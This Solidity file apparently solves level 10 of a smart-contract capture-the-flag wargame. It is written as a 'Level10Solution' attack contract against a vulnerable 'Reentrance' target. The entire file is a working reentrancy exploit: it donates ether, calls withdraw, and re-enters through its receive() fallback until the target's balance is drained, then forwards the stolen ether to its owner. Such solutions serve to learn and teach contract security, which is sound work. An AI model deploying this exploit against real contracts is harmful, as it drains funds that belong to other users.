// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    receive() external payable;
}

contract Level10Solution is Ownable {
    uint256 initialDeposit;
    IReentrance private target;

    constructor(address payable _address) {
        target = IReentrance(_address);
    }

    function attack() public payable onlyOwner {
        initialDeposit = msg.value;
        target.donate{value: initialDeposit}(address(this));
        repeater();
    }

    function repeater() private {
        uint256 remainingBalance = address(target).balance;
        uint256 ourBalance = target.balanceOf(address(this));

        if (remainingBalance >= ourBalance) {
            target.withdraw(ourBalance);
        } else if (remainingBalance > 0) {
            target.withdraw(remainingBalance);
        }
    }

    receive() external payable {
        repeater();
    }

    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        (bool sent, ) = payable(owner()).call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
